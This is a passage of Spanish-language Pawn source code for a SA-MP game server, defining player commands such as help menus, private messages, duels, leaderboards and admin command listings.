	return ShowPlayerDialog(playerid, D_MENU_CONFIGURACION_CLIMA, DIALOG_STYLE_INPUT, "{7C7C7C}SelecciÛn clima del juego", str , ">>", "X");

}

stock mostrarMenuConfiguracionHora(playerid){
	new str[420];
	format(str, sizeof(str), "{FFFFFF}Escribe la {26BF61}hora {FFFFFF}en n˙mero.");
	return ShowPlayerDialog(playerid, D_MENU_CONFIGURACION_HORA, DIALOG_STYLE_INPUT, "{7C7C7C}SelecciÛn hora del juego", str , ">>", "X");

}

/* Comandos para jugadores */

CMD:ayuda(playerid, params[]){
	return mostrarComandosNormales(playerid);
}

CMD:comandos(playerid, params[]){
	return mostrarComandosNormales(playerid);
}

CMD:cmds(playerid, params[]){
	return mostrarComandosNormales(playerid);
}

stock mostrarComandosNormales(playerid){
	new string[2048];
	strcat(string, "{7C7C7C}/{26BF61}id {7C7C7C}[id] \t{7C7C7C}- Muestra los datos de conexiÛn de un jugador, puedes poner tu ID.");
	strcat(string, "\n{7C7C7C}/{26BF61}stats {7C7C7C}[id] \t{7C7C7C}- Muestra los stats de un jugador, puedes poner tu ID.");
	strcat(string, "\n{7C7C7C}/{26BF61}pm {7C7C7C}[id] [mensaje]\t{7C7C7C}- Envias un mensaje privado a un jugador.");
	strcat(string, "\n{7C7C7C}/{26BF61}partidas \t{7C7C7C}- Men˙ donde puedes ver todas las partidas que se realizaron.");
	strcat(string, "\n{7C7C7C}/{26BF61}cuenta \t{7C7C7C}- Men˙ de configuraciÛn sobre tu cuenta.");
	strcat(string, "\n{7C7C7C}/{26BF61}equipo \t{7C7C7C}- Men˙ donde puedes cambiar de equipo.");
	strcat(string, "\n{7C7C7C}/{26BF61}mundo \t{7C7C7C}- Men˙ donde puedes cambiar de mundo.");
	strcat(string, "\n{7C7C7C}/{26BF61}duelo \t{7C7C7C}- Men˙ donde puedes configurar un duelo contra un jugador (solo espectadores)");
	strcat(string, "\n{7C7C7C}/{26BF61}top\t{7C7C7C}- Men˙ donde puedes ver todos los TOP's del servidor.");
	strcat(string, "\n{7C7C7C}/{26BF61}admins\t{7C7C7C}- Lista donde puedes ver toda la configuraciÛn actual de la partida.");
	strcat(string, "\n{7C7C7C}/{26BF61}info\t{7C7C7C}- Lista donde puedes ver los administradores y moderadores conectados.");
	strcat(string, "\n{7C7C7C}/{26BF61}jetpack \t{7C7C7C}- Obtienes un jetpack (solo para espectadores).");
	strcat(string, "\n{7C7C7C}/{26BF61}camara \t{7C7C7C}- Obtienes una c·mara (solo para espectadores).");
	strcat(string, "\n{7C7C7C}/{26BF61}unbug \t{7C7C7C}- Si te encontras bug, este comando sirve.");
	strcat(string, "\n{7C7C7C}/{26BF61}return \t{7C7C7C}- Te devuelve al spawn de tu equipo.");
	strcat(string, "\n{7C7C7C}/{26BF61}kill \t{7C7C7C}- Te suicidas, buena manera de terminar tu vida.");
	return ShowPlayerDialog(playerid, 1948, DIALOG_STYLE_TABLIST, "Comandos", string, "Ok", "");
}

CMD:cambiarnombre(playerid, params[]){
	if(!Jugador[playerid][puedeCambiarNombre] && Jugador[playerid][Admin] < 2)
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No puedes cambiar tu nombre, pidele a un administrador.");

	return mostrarCambioNombre(playerid);
}

stock mostrarCambioNombre(playerid){
	new str[420];
	format(str, sizeof(str), "{FFFFFF}Ingresa el nuevo {26BF61}nombre {FFFFFF}que deseas tener.");
	return ShowPlayerDialog(playerid, D_CAMBIAR_NOMBRE, DIALOG_STYLE_INPUT, "{7C7C7C}Cambio de nombre", str , ">>", "X");
}


CMD:admins(playerid, params[]){
	if(!hayAdmins())
	    return SendClientMessage(playerid, COLOR_AMARILLO, "> No hay administradores conectados");

	new strTitulo[100], strAdmins[1000], str[256], Cant = 0;
    format(str, sizeof(str), "{7C7C7C}Nick\t{7C7C7C}Nivel\t{7C7C7C}Mundo");
    strcat(strAdmins, str);
	ForPlayers(i){
	    if(Jugador[i][Admin] > 0){
	        format(str, sizeof(str), "\n{%06x}%s\t{FFFFFF}%s\t{FFFFFF}%d", colorJugador(i), obtenerNick(i), obtenerTipoAdmin(Jugador[i][Admin]), GetPlayerVirtualWorld(i));
	        strcat(strAdmins, str);
	        Cant++;
	    }
	}
	format(str, sizeof(str), "{7C7C7C}Hay %d administrador/es conectado/s", Cant);
	strcat(strTitulo, str);

	ShowPlayerDialog(playerid, 2343, DIALOG_STYLE_TABLIST_HEADERS, strTitulo, strAdmins, "Cerrar", "");
	return 1;
}

stock hayAdmins(){
	ForPlayers(i)
	    if(Jugador[i][Admin] > 0)
		    return 1;
	return 0;
}

CMD:skin(playerid, params[]){
	if(isnull(params))
	    return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando.");
	new id = strval(params), str[128];

	if(id > 311 || id < 0)
	    return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal los par·metros, solo entre 0 y 311.");

	if(id == Jugador[playerid][Skin])
 		return SendClientMessage(playerid, COLOR_AMARILLO, "> Ya tienes ese skin puesto.");

	SetPlayerSkin(playerid, id);
	format(str, sizeof(str), "Cambiaste el n˙mero de tu skin ({FFFFFF}%d{C9C9C9})", id);
	SendClientMessage(playerid, COLOR_NEUTRO, str);
	Jugador[playerid][Skin] = id;
	return 1;
}

CMD:hora(playerid, params[]){
	if(isnull(params))
	    return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando.");

	new id = strval(params), str[128];

	if(id > 23 || id < 0)
	    return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal los parÔøΩmetros, solo entre 0 y 23.");

	if(id == Jugador[playerid][Hora])
	    return SendClientMessage(playerid, COLOR_AMARILLO, "> Ya tienes esa hora puesto.");

	SetPlayerTime(playerid, id, 0);
	format(str, sizeof(str), "Cambiaste la hora de tu juego ({FFFFFF}%d{C9C9C9})", id);
	SendClientMessage(playerid, COLOR_NEUTRO, str);
	Jugador[playerid][Hora] = id;
	return 1;
}

CMD:class(playerid, params[]){
	actualizarMarcador(GetPlayerVirtualWorld(playerid));
	return mostrarMenuEquipos(playerid);
}

CMD:equipo(playerid, params[]){
	actualizarMarcador(GetPlayerVirtualWorld(playerid));
	return mostrarMenuEquipos(playerid);
}

CMD:mundo(playerid, params[]){
	new Texto[200];
	if(Equipo[playerid] != EQUIPO_ESPECTADOR)
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Tienes que estar en el equipo Espectador.");
	Equipo[playerid] = NULO;
	actualizarJugadores(GetPlayerVirtualWorld(playerid), EQUIPO_ESPECTADOR);
	format(Texto, sizeof(Texto), "[MUNDO %d] {%06x}%s {C9C9C9}fue a elegir otro mundo.", GetPlayerVirtualWorld(playerid), colorJugador(playerid), obtenerNick(playerid));
	enviarATodos(GetPlayerVirtualWorld(playerid), Texto);
	SetPlayerColor(playerid, COLOR_GRIS);
	return mostrarMenuMundos(playerid);
}

CMD:info(playerid, params[]){
	return mostrarInfoPartidaActual(playerid);
}

CMD:jetpack(playerid, params[]){
	if(Equipo[playerid] != EQUIPO_ESPECTADOR)
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Tienes que estar en el equipo Espectador.");
	
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USEJETPACK);
	return 1;
}

CMD:camara(playerid, params[]){
	if(Equipo[playerid] != EQUIPO_ESPECTADOR)
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Tienes que estar en el equipo Espectador.");

	GivePlayerWeapon(playerid, 43, 64);
	return 1;
}


CMD:return(playerid, params[]){
	if(Duelo[playerid][enCurso])
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No puedes respawnear si estas en un duelo.");

	new str[200];
	format(str, sizeof(str), "{%06x}%s {C9C9C9}se ha respawneado.", colorJugador(playerid), Jugador[playerid][Nombre]);
	enviarATodos(GetPlayerVirtualWorld(playerid), str);
	CallLocalFunction("Spawn", "i", playerid);
	return 1;
}


CMD:unbug(playerid, params[]){
	new Float:health, Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	GetPlayerHealth(playerid,health);
	//SetPlayerInterior(playerid, 0);
	CallLocalFunction("Spawn", "i", playerid);
	SetPlayerPos(playerid, x, y, z);
	SetPlayerHealth(playerid, health);
	Jugador[playerid][Desbugeando] = true;
	new str[200];
	format(str, sizeof(str), "{%06x}%s {C9C9C9}se ha desbugeado.", colorJugador(playerid), Jugador[playerid][Nombre]);
	enviarATodos(GetPlayerVirtualWorld(playerid), str);
	return 1;
}

CMD:kill(playerid, params[]){
	if(Duelo[playerid][enCurso])
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No puedes matarte si estas en un duelo.");

	SetPlayerHealth(playerid, -1);
	new str[200];
	format(str, sizeof(str), "{%06x}%s {C9C9C9}se reprimiÛ y muriÛ.", colorJugador(playerid), Jugador[playerid][Nombre]);
	enviarATodos(GetPlayerVirtualWorld(playerid), str);
	return 1;
}

CMD:id(playerid, params[]){
    new i;
    if(isnull(params))
		i = playerid;
    else
		i = strval(params);

	if(!IsPlayerConnected(i))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No existe la ID que pusiste.");
		
    return mostrarConexion(playerid, i);
}

CMD:stats(playerid, params[]){
    new i;
    if(isnull(params)) i = playerid;
    else i = strval(params);

	if(!IsPlayerConnected(i))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No existe la ID que pusiste.");

    return mostrarStats(playerid, i);
}

CMD:c(playerid, params[]){
	mostrarMenuConfiguracionJugador(playerid);
	return 1;
}

CMD:cuenta(playerid, params[]){
    CallLocalFunction("guardarIp", "i", playerid);
	mostrarMenuConfiguracionJugador(playerid);
	return 1;
}


CMD:pm(playerid, params[]){
	new Mensaje[400], id;
	
	if(sscanf(params, "us", id, Mensaje))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> Escribiste mal el comando; {FFFFFF}/pm ID texto");

 	if(!IsPlayerConnected(id))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No existe la ID que pusiste.");

	if(id == playerid)
	    return SendClientMessage(playerid, COLOR_AMARILLO, "> No podes enviarte un pm a vos mismo.");

	if(!Jugador[id][mensajesPrivados])
	    return SendClientMessage(playerid, COLOR_AMARILLO, "> El jugador tiene los mensajes privados desactivados.");

	enviarMensajePrivado(playerid, id, Mensaje);
	return 1;
}

stock enviarMensajePrivado(emisor, receptor, texto[]){
	new str[800];

	format(str, sizeof(str), "{C9C9C9}PM enviado a {%06x}%s{C9C9C9} (%d): {FFFFFF}%s", colorJugador(receptor), obtenerNick(receptor), receptor, texto);
	PlayerPlaySound(emisor, 1085, 0.0, 0.0, 0.0);
	SendClientMessage(emisor, COLOR_NEUTRO, str);

	format(str, sizeof(str), "{C9C9C9}PM recibido de {%06x}%s{C9C9C9} (%d): {FFFFFF}%s", colorJugador(emisor), obtenerNick(emisor), emisor, texto);
	PlayerPlaySound(receptor, 1085, 0.0, 0.0, 0.0);

	SendClientMessage(receptor, COLOR_NEUTRO, str);
	return 1;
}

CMD:top(playerid, params[]){
	return mostrarMenuTop(playerid);
}

stock mostrarMenuTop(playerid){
	new Dialogo[1000], string[254];
	format(string, sizeof(string), "{7C7C7C}Puntaje en SOLO");			strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Puntaje en EQUIPO");		strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Duelos ganados");			strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Duelos perdidos");		strcat(Dialogo, string);
	return ShowPlayerDialog(playerid, D_MENU_TOP, DIALOG_STYLE_TABLIST, "{7C7C7C}Tops del servidor", Dialogo, "Elegir", "X");
}

stock mostrarTop(tipo, playerid){
	new i = 1, Dialogo[1024], nombreTop[20], nombreDialog[100], nombrePuntos[20], Consulta[300];
	new DBResult:resultado, Datos[128], Puntos, Nick[40];
	switch(tipo){
	    case 0:
		{
			nombreTop = "puntajeSolo";
			nombreDialog = "Puntaje en solo";
			nombrePuntos = "Puntos";
		}
	    case 1:
		{
			nombreTop = "puntajeEquipo";
			nombreDialog = "Puntaje en equipo";
			nombrePuntos = "Puntos";
		}
	    case 2:
		{
			nombreTop = "duelosGanados";
			nombreDialog = "Duelos ganados";
			nombrePuntos = "Cantidad";
		}
		case 3:
		{
            nombreTop = "duelosPerdidos";
			nombreDialog = "Duelos perdidos";
			nombrePuntos = "Cantidad";
		}
	}
	format(Consulta, sizeof(Consulta), "SELECT Nombre, %s FROM Cuentas WHERE %s > 0 ORDER BY %s DESC LIMIT 20", nombreTop, nombreTop, nombreTop);
	resultado = db_query(Cuentas, Consulta);
	new str[100];
	format(str, sizeof(str), "{7C7C7C}PosiciÛn\t{7C7C7C}%s\t{7C7C7C}Nombre", nombrePuntos);
	strcat(Dialogo, str);
	if(db_num_rows(resultado)){
		do{
			Puntos = db_get_field_assoc_int(resultado, nombreTop);
			db_get_field_assoc(resultado, "Nombre", Nick, sizeof(Nick));
			format(Datos, sizeof(Datos), "\n{7C7C7C}%d\t{FFFFFF}%d\t{FFFFFF}%s", i, Puntos, Nick);
			strcat(Dialogo, Datos);
			i++;
		}while(db_next_row(resultado));
		db_free_result(resultado);
		ShowPlayerDialog(playerid, D_MENU_TOP_DATOS, DIALOG_STYLE_TABLIST_HEADERS, nombreDialog, Dialogo, "<<", "X");
	}else{
		ShowPlayerDialog(playerid, D_MENU_TOP_DATOS, DIALOG_STYLE_TABLIST_HEADERS, nombreDialog, "No hay jugadores para mostrar", "<<", "X");
	}
}

CMD:creditos(playerid, params[]){
    new string[1200];
	strcat(string,"{FFFFFF}- {7C7C7C}Desarrollador{B8B8B8}: {FFFFFF}Andrew Manu");
	strcat(string,"\n{FFFFFF}- {7C7C7C}Contacto{B8B8B8}: {FFFFFF}wtxclanx@hotmail.com");
	strcat(string,"\n{FFFFFF}- {7C7C7C}VersiÛn{B8B8B8}: {FFFFFF}0.1a");
	strcat(string,"\n\n{7C7C7C}El servidor garantiza la confidencialidad y protecciÛn de tus datos.");
	strcat(string,"\n{7C7C7C}Todos los sistemas fueron desarrollados desde 0.");
	ShowPlayerDialog(playerid, 194, 0, "InformaciÛn sobre el servidor", string, "Ok", "");
	return 1;
}

CMD:duelo(playerid, params[]){
	if(tieneOponente(playerid)){
		new Texto[264];
		format(Texto, sizeof(Texto), "[{26BF61}DUELO{C9C9C9}] Tienes un duelo pendiente con {%06x}%s{C9C9C9}.",
		colorJugador(idOponente(playerid)), Jugador[idOponente(playerid)][Nombre]);
		return SendClientMessage(playerid, COLOR_NEUTRO, Texto);
	}
	if(Duelo[playerid][Esperando]){
		new Texto[264];
		format(Texto, sizeof(Texto), "[{26BF61}DUELO{C9C9C9}] Espera a que {%06x}%s{C9C9C9} responda al duelo que le enviaste.", colorJugador(Duelo[playerid][Oponente]), Jugador[Duelo[playerid][Oponente]][Nombre]);
		return SendClientMessage(playerid, COLOR_NEUTRO, Texto);
	}
	if(Duelo[playerid][enCurso]){
		new Texto[264];
		format(Texto, sizeof(Texto), "[{26BF61}DUELO{C9C9C9}] Estas dueleando con {%06x}%s{C9C9C9}.", colorJugador(Duelo[playerid][Oponente]), Jugador[Duelo[playerid][Oponente]][Nombre]);
		return SendClientMessage(playerid, COLOR_NEUTRO, Texto);
	}
	if(Equipo[playerid] != EQUIPO_ESPECTADOR)
   			return SendClientMessage(playerid, COLOR_AMARILLO, "> Solo los espectadores pueden configurar duelos");

	return mostrarMenuDuelo(playerid);
}

stock mostrarMenuDuelo(playerid){
	new Dialogo[1000], string[254];

	Duelo[playerid][Configurando] = true;
 	strcat(Dialogo, "{7C7C7C}Par·metro\t{7C7C7C}SelecciÛn\n\n");
	format(string, sizeof(string), "\n{7C7C7C}Mapa\t{FFFFFF}%s", nombreDueloMapas[Duelo[playerid][Mapa]]);	strcat(Dialogo, string);
	if(Duelo[playerid][Oponente] == -1)
		format(string, sizeof(string), "\n{7C7C7C}Oponente\t{FFFFFF}Nadie");
	else
		format(string, sizeof(string), "\n{7C7C7C}Oponente\t{FFFFFF}%s", Jugador[Duelo[playerid][Oponente]][Nombre]);	strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Armas\t{FFFFFF}%s", nombreDueloArmas[Duelo[playerid][tipoArma]]);			strcat(Dialogo, string);
	format(string, sizeof(string), "\n{26BF61}Crear duelo", nombreDueloArmas[Duelo[playerid][tipoArma]]);			strcat(Dialogo, string);
	return ShowPlayerDialog(playerid, D_MENU_DUELO, DIALOG_STYLE_TABLIST_HEADERS, "{7C7C7C}Configurar un Duelo", Dialogo, ">>", "X");
}

stock mostrarMenuTipoArmaDuelo(playerid){
	new Dialogo[1000], string[254];

 	strcat(Dialogo, "{7C7C7C}Nombre\t{7C7C7C}Contiene\n\n");
	format(string, sizeof(string), "\n{7C7C7C}Armas RÔøΩpidas\t9MM, Escopeta Recortada, Tec-9");	strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Armas Lentas\t{FFFFFF}DK, Escopeta, Sniper");		strcat(Dialogo, string);
	return ShowPlayerDialog(playerid, D_MENU_DUELO_ARMAS, DIALOG_STYLE_TABLIST_HEADERS, "{7C7C7C}SelecciÔøΩn de Armas", Dialogo, ">>", "X");
}

stock mostrarMenuMapasDuelo(playerid){
	new Dialogo[1000], string[254];

 	strcat(Dialogo, "{7C7C7C}Mapa\t{7C7C7C}Info\n\n");
	format(string, sizeof(string), "\n{7C7C7C}Warehouse\t%s", queryDueloMapa(1));	strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Kursk\t%s", queryDueloMapa(2));		strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Estadio\t%s", queryDueloMapa(3));		strcat(Dialogo, string);
	return ShowPlayerDialog(playerid, D_MENU_DUELO_MAPAS, DIALOG_STYLE_TABLIST_HEADERS, "{7C7C7C}SelecciÔøΩn de Mapa", Dialogo, ">>", "X");
}

stock mostrarMenuOponenteDuelo(playerid){
	new str[420];
	format(str, sizeof(str), "{FFFFFF}Escribe la {26BF61}ID {FFFFFF}del jugador con quien quieres duelear.\nPuedes apretar {26BF61}TAB {FFFFFF}para fijarte mÔøΩs detalladamente.");
	return ShowPlayerDialog(playerid, D_MENU_DUELO_OPONENTE, DIALOG_STYLE_INPUT, "{7C7C7C}ElecciÔøΩn del Oponente", str , ">>", "X");

}

stock enviarPeticionDuelo(creador, oponente){
	new Texto[1024], str[264];
	format(str, sizeof(str), "[{26BF61}DUELO{C9C9C9}] {%06x}%s {C9C9C9}te invito a un duelo en", colorJugador(creador), obtenerNick(creador));
	strcat(Texto, str);
	format(str, sizeof(str), " {FFFFFF}%s {C9C9C9}con {FFFFFF}%s", nombreDueloMapas[Duelo[creador][Mapa]], nombreDueloArmas[Duelo[creador][tipoArma]]);
	strcat(Texto, str);
	SendClientMessage(oponente, COLOR_NEUTRO, Texto);
	SendClientMessage(oponente, COLOR_NEUTRO, "[{26BF61}DUELO{C9C9C9}] Puedes escribir {FFFFFF}/aceptar {C9C9C9}o {FFFFFF}/cancelar");
}

stock actualizarOponente(playerid){
	SendClientMessage(playerid, COLOR_NEUTRO, "[{26BF61}DUELO{C9C9C9}] Tu oponente se ha desconectado, elije otro o cancela la creaciÛn de duelo.");
	Duelo[playerid][Oponente] = -1;
}

CMD:aceptar(playerid, params[]){
	if(!tieneOponente(playerid))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No tienes un duelo pendiente que aceptar.");
	return comenzarDuelo(idOponente(playerid), playerid);
}

CMD:cancelar(playerid, params[]){
	print("hola");

	if(Duelo[playerid][enCurso]){
		new Texto[264];
		format(Texto, sizeof(Texto), "[{26BF61}DUELO{C9C9C9}] Estas dueleando con {%06x}%s{C9C9C9}.", colorJugador(Duelo[playerid][Oponente]), Jugador[Duelo[playerid][Oponente]][Nombre]);
		return SendClientMessage(playerid, COLOR_NEUTRO, Texto);
	}

	if(Duelo[playerid][Esperando]){
		new txt[400], txt2[300];
		format(txt, sizeof(txt), "[{26BF61}DUELO{C9C9C9}] {%06x}%s{C9C9C9} decidiÛ cancelar el duelo.", colorJugador(playerid), obtenerNick(playerid));
		SendClientMessage(Duelo[playerid][Oponente], COLOR_NEUTRO, txt);
		format(txt2, sizeof(txt2), "[{26BF61}DUELO{C9C9C9}] Se ha cancelado el duelo contra {%06x}%s{C9C9C9}.", colorJugador(Duelo[playerid][Oponente]), obtenerNick(Duelo[playerid][Oponente]));
        SendClientMessage(playerid, COLOR_NEUTRO, txt);
		resetConfiguracionDuelo(playerid);
    	resetConfiguracionDuelo(Duelo[playerid][Oponente]);
		return 0;
	}
	if(!tieneOponente(playerid))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No tienes un duelo pendiente que cancelar.");

 	return cancelarDuelo(idOponente(playerid));
}


stock resetConfiguracionDuelo(playerid){
	Duelo[playerid][Configurando] = false;
	Duelo[playerid][Esperando] = false;
	Duelo[playerid][enCurso] = false;
	Duelo[playerid][Creador] = false;
	
	if(Duelo[playerid][Mapa] != 0){
		dueloMapaEstado[Duelo[playerid][Mapa]] = true;
		Duelo[playerid][Mapa] = 0;
	}else
		Duelo[playerid][Mapa] = 0;
		
	Duelo[playerid][Oponente] = -1;
	Duelo[playerid][tipoArma] = 0;
	Duelo[playerid][Contador] = 0;
	Duelo[playerid][Minutos] = 0;
	Duelo[playerid][Segundos] = 0;
}

stock comenzarDuelo(creador, oponente){
	Duelo[oponente][Esperando] = false;
 	Duelo[creador][Configurando] = false;
	Duelo[oponente][enCurso] = true;
	Duelo[creador][enCurso] = true;
	dueloMapaEstado[Duelo[creador][Mapa]] = true;
	
	Jugador[creador][mundoAnterior] = GetPlayerVirtualWorld(creador);
	Jugador[oponente][mundoAnterior] = GetPlayerVirtualWorld(oponente);

	SetPlayerColor(creador, COLOR_BLANCO);
	SetPlayerColor(oponente, COLOR_BLANCO);

	new numeroMapa = Duelo[creador][Mapa];
	new numeroArma = Duelo[creador][tipoArma];
	
	SetPlayerPos(creador, posicionesArenaDuelo[numeroMapa][0][0], posicionesArenaDuelo[numeroMapa][0][1], posicionesArenaDuelo[numeroMapa][0][2]);
	SetPlayerPos(oponente, posicionesArenaDuelo[numeroMapa][1][0], posicionesArenaDuelo[numeroMapa][1][1], posicionesArenaDuelo[numeroMapa][1][2]);
	SetPlayerInterior(creador, interiorDueloMapa[numeroMapa]);
	SetPlayerInterior(oponente, interiorDueloMapa[numeroMapa]);
	

	new mundoA = GetPlayerVirtualWorld(creador);

	SetPlayerVirtualWorld(creador, 200);
	SetPlayerVirtualWorld(oponente, 200);
	
	actualizarJugadores(mundoA, EQUIPO_ESPECTADOR);

    darArmasDuelo(creador, numeroArma);
    darArmasDuelo(oponente, numeroArma);
	
    SetPlayerHealth(creador, 100.0);
    SetPlayerHealth(oponente, 100.0);
    
    SetPlayerArmour(creador, 100.0);
    SetPlayerArmour(oponente, 100.0);
    
   	Duelo[creador][Timer] = SetTimerEx("contadorTiempoDuelo", 1000, true, "i", creador);
   	
	new Texto[1000];
	format(Texto, sizeof(Texto), "[{26BF61}DUELO{C9C9C9}] {%06x}%s{C9C9C9} v/s {%06x}%s {C9C9C9}({FFFFFF}%s{C9C9C9}, {FFFFFF}%s{C9C9C9} )",
	colorJugador(creador), obtenerNick(creador), colorJugador(oponente), obtenerNick(oponente), nombreDueloMapas[numeroMapa], nombreDueloArmas[numeroArma]);
	SendClientMessageToAll(COLOR_NEUTRO, Texto);
	return 1;
}


public contadorTiempoDuelo(playerid){
	Duelo[playerid][Segundos]++;
	if(Duelo[playerid][Segundos] == 60){
	    Duelo[playerid][Minutos]++;
	    Duelo[playerid][Segundos] = 0;
	}
}

stock darArmasDuelo(playerid, id){
	switch(id){
	    case 0: {}
	    case 1: darArmasRapidas(playerid);
	    case 2: darArmasLentas(playerid);
	}
}

stock cancelarDuelo(creador){
	resetConfiguracionDuelo(creador);
	return 1;
}

stock terminarDuelo(playerid, killerid){

	new idCreador, minutos, segundos;
	if(Duelo[playerid][Creador])
	    idCreador = playerid;
	else
	    idCreador = killerid;
	    
	segundos = Duelo[idCreador][Segundos];
	minutos = Duelo[idCreador][Minutos];
	KillTimer(Duelo[idCreador][Timer]);
	
	resetConfiguracionDuelo(killerid);
	resetConfiguracionDuelo(playerid);
	
	SetPlayerVirtualWorld(playerid, Jugador[playerid][mundoAnterior]);
	SetPlayerVirtualWorld(killerid, Jugador[killerid][mundoAnterior]);

	SetPlayerInterior(playerid, 0);
	SetPlayerInterior(killerid, 0);

	Equipo[playerid] = EQUIPO_ESPECTADOR;
	Equipo[killerid] = EQUIPO_ESPECTADOR;
	
	new Float:Vida, Float:Armor, s[1000];
	GetPlayerHealth(killerid, Vida);
	GetPlayerArmour(killerid, Armor);
	format(s, sizeof(s), "[{26BF61}DUELO{C9C9C9}] {%06x}%s {C9C9C9}ganÛ el duelo contra {%06x}%s {C9C9C9}(%.2f / %.2f, %dm:%ds)",
	colorJugador(killerid), obtenerNick(killerid), colorJugador(playerid), obtenerNick(playerid), Vida, Armor, minutos, segundos);
    SendClientMessageToAll(COLOR_NEUTRO, s);
    
	Jugador[killerid][duelosGanados]++;
	Jugador[playerid][duelosPerdidos]++;
	
    SetPlayerColor(killerid, COLOR_CYAN);
    SetPlayerColor(playerid, COLOR_CYAN);
    
	CallLocalFunction("guardarDatos", "i", playerid);
	CallLocalFunction("guardarDatos", "i", killerid);

	SpawnPlayer(killerid);
	SpawnPlayer(playerid);
	return 1;
}

CMD:mundoduelo19(playerid, params[]){
	//actualizarJugadores(GetPlayerVirtualWorld(playerid), EQUIPO_ESPECTADOR);
	SetPlayerColor(playerid, COLOR_NEUTRO);
	return mostrarMenuMundos(playerid);
}

stock estaEnDuelo(playerid){
	return Duelo[playerid][enCurso];
}

stock tieneOponente(playerid){
	ForPlayers(i)
	    if(Duelo[i][Oponente] == playerid)
	        return 1;
	return 0;
}

stock idOponente(playerid){
	ForPlayers(i)
	    if(Duelo[i][Oponente] == playerid)
	        return i;
	return 0;
}

stock queryDueloMapa(numeroMapa){
	new str[30];
	if(dueloMapaEstado[numeroMapa])
	    format(str, sizeof(str), "{26BF61}Disponible");
	else
		format(str, sizeof(str), "{FF5353}Ocupado");
	return str;
}

/* Comandos para administradores nivel 1 (Moderador) */

CMD:acmds(playerid, params[]){
	return mostrarComandosAdmin(playerid);
}

stock mostrarComandosAdmin(playerid){
	new Dialogo[2000], str[100], nivel = Jugador[playerid][Admin];
	if(nivel >= 1){
		for(new i=0;i<sizeof(comandosModerador);i++){
			format(str, sizeof(str), "\n{26BF61}%s", comandosModerador[i]);
			strcat(Dialogo, str);
		}
	}
	if(nivel >= 2){
		for(new i=0;i<sizeof(comandosModeradorG);i++){
			format(str, sizeof(str), "\n{26BF61}%s", comandosModeradorG[i]);
			strcat(Dialogo, str);
		}
	}
	if(nivel >= 3){
		for(new i=0;i<sizeof(comandosAdministrador);i++){
			format(str, sizeof(str), "\n{26BF61}%s", comandosAdministrador[i]);
			strcat(Dialogo, str);
		}
	}
	return ShowPlayerDialog(playerid, D_COMANDOS_ADMIN, DIALOG_STYLE_LIST, "{7C7C7C}Comandos de administrador", Dialogo, ">>", "X");
}


CMD:fps(playerid, params[]){
    new i;
    if(isnull(params))
		i = playerid;
    else
		i = strval(params);

	if(!IsPlayerConnected(i))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No existe la ID que pusiste.");

	new str[300];
	format(str, sizeof(str), "- {B8B8B8}%s{FFFFFF} tiene ª {F69521}%d{FFFFFF} FPS.", obtenerNick(i), GetPlayerFPS(i));
	enviarATodos(GetPlayerVirtualWorld(playerid), str);
	return 1;
}

CMD:pl(playerid, params[]){
    new i;
    if(isnull(params))
		i = playerid;
    else
		i = strval(params);

	if(!IsPlayerConnected(i))
		return SendClientMessage(playerid, COLOR_AMARILLO, "> No existe la ID que pusiste.");

	new str[300];
	format(str, sizeof(str), "- {B8B8B8}%s{FFFFFF} tiene ª {F69521}%.1f{FFFFFF} paquetes perdidos.", obtenerNick(i), NetStats_PacketLossPercent(i));
	enviarATodos(GetPlayerVirtualWorld(playerid), str);
	return 1;
}

CMD:mostrardatos(playerid, params[]){
	return mostrarMenuDatos(playerid);
}

stock mostrarMenuDatos(playerid){
	new Dialogo[1000], string[254];
	format(string, sizeof(string), "{7C7C7C}Fps de todos");		strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Pl de todos");		strcat(Dialogo, string);
	format(string, sizeof(string), "\n{7C7C7C}Ms de todos");	strcat(Dialogo, string);
	return ShowPlayerDialog(playerid, D_MENU_MOSTRAR_DATOS, DIALOG_STYLE_TABLIST, "{7C7C7C}SelecciÛn", Dialogo, "Elegir", "X");
}

stock mostrarDatosMundo(numeroMundo, tipo){
	new str[100];
	enviarATodos(numeroMundo, " ");
	switch(tipo){
		case 0:
		{
			enviarATodos(numeroMundo, "- Fps de todos:");
			ForPlayers(i){
				if(GetPlayerVirtualWorld(i) == numeroMundo){
					format(str, sizeof(str), "- {B8B8B8}%s{FFFFFF} tiene ª {F69521}%d {FFFFFF}FPS.", obtenerNick(i), GetPlayerFPS(i));
					enviarATodos(numeroMundo, str);
				}
			}
		}
		case 1:
		{
			enviarATodos(numeroMundo, "- Pl de todos:");
			ForPlayers(i){
				if(GetPlayerVirtualWorld(i) == numeroMundo){
					format(str, sizeof(str), "- {B8B8B8}%s{FFFFFF} tiene ª {F69521}%.1f{FFFFFF} paquetes perdidos.", obtenerNick(i), NetStats_PacketLossPercent(i));
					enviarATodos(numeroMundo, str);
				}
			}
		}
		case 2:
		{
			enviarATodos(numeroMundo, "- Ms de todos:");
			ForPlayers(i){
				if(GetPlayerVirtualWorld(i) == numeroMundo){
